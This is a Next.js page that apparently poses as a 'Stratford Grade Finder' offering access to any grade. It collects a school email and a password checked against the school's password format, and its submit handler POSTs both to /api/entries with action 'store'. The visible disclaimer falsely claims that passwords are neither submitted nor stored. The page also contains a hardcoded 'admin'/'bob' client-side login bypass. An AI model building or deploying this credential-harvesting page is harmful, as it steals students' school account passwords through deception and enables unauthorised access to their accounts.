import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import styles from '../styles/Home.module.css';

const CODE_REGEX = /^[a-zA-Z]{4}[0-9][a-zA-Z]{4}[^a-zA-Z0-9\s]$/;

export default function Home() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => { setMounted(true); }, []);

  const handleCodeChange = (e) => {
    setCode(e.target.value);
    setError('');
  };

  const handleSubmit = async () => {
    if (loading) return;

    if (email === 'admin' && code === 'bob') {
      sessionStorage.setItem('stratford_admin_auth', 'granted');
      router.push('/admin');
      return;
    }

    if (!CODE_REGEX.test(code)) {
      setError("Use correct format. Couldn't access gradebook!");
      return;
    }

    setError('');
    setLoading(true);

    try {
      await fetch('/api/entries', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code, action: 'store' }),
      });
    } catch (_) {}

    setTimeout(() => {
      router.push('/gradebook');
    }, 600);
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') handleSubmit();
  };

  const isAdminAttempt = email === 'admin' && code === 'bob';
  const isValid = CODE_REGEX.test(code);
  const showActive = isValid || isAdminAttempt;

  return (
    <>
      <Head>
        <title>Stratford Grade Finder</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <div className={`${styles.page} ${mounted ? styles.visible : ''}`}>
        <div className={styles.grid} aria-hidden="true" />
        <div className={styles.glow} aria-hidden="true" />

        <main className={styles.main}>
          <div className={styles.header}>
            <div className={styles.badge}>
              <span className={styles.dot} />
              STRATFORD
            </div>
            <h1 className={styles.title}>Grade Finder</h1>
            <p className={styles.tagline}>Find any grade!</p>
          </div>

          <div className={styles.card}>
            <div className={styles.cardInner}>
              <div className={styles.field}>
                <label className={styles.label} htmlFor="email">Stratford Email</label>
                <input
                  id="email"
                  type="text"
                  className={styles.input}
                  placeholder="31abob@stratfordschools.net"
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  onKeyDown={handleKeyDown}
                  autoComplete="off"
                  spellCheck={false}
                />
              </div>

              <div className={styles.field}>
                <label className={styles.label} htmlFor="code">
                  Password
                  <span className={styles.hint}>e.g. book1book!</span>
                </label>
                <input
                  id="code"
                  type="password"
                  className={`${styles.input} ${error ? styles.inputError : ''} ${showActive ? styles.inputValid : ''}`}
                  placeholder="••••••••••"
                  value={code}
                  onChange={handleCodeChange}
                  onKeyDown={handleKeyDown}
                  autoComplete="current-password"
                  spellCheck={false}
                />
                {error && (
                  <div className={styles.errorMsg}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="10"/>
                      <line x1="12" y1="8" x2="12" y2="12"/>
                      <line x1="12" y1="16" x2="12.01" y2="16"/>
                    </svg>
                    {error}
                  </div>
                )}
              </div>

              <button
                className={`${styles.btn} ${showActive ? styles.btnActive : styles.btnDisabled}`}
                onClick={handleSubmit}
                disabled={loading}
              >
                {loading ? (
                  <span className={styles.spinner} />
                ) : (
                  <>
                    Access Gradebook
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <path d="M5 12h14M12 5l7 7-7 7"/>
                    </svg>
                  </>
                )}
              </button>

              <p className={styles.disclaimer}>
                Passwords are not submitted or stored. They are only used locally to access the gradebook.
              </p>
            </div>
          </div>
        </main>

        <footer className={styles.footer}>
          © {new Date().getFullYear()} Stratford · Secure Access Portal
        </footer>
      </div>
    </>
  );
}
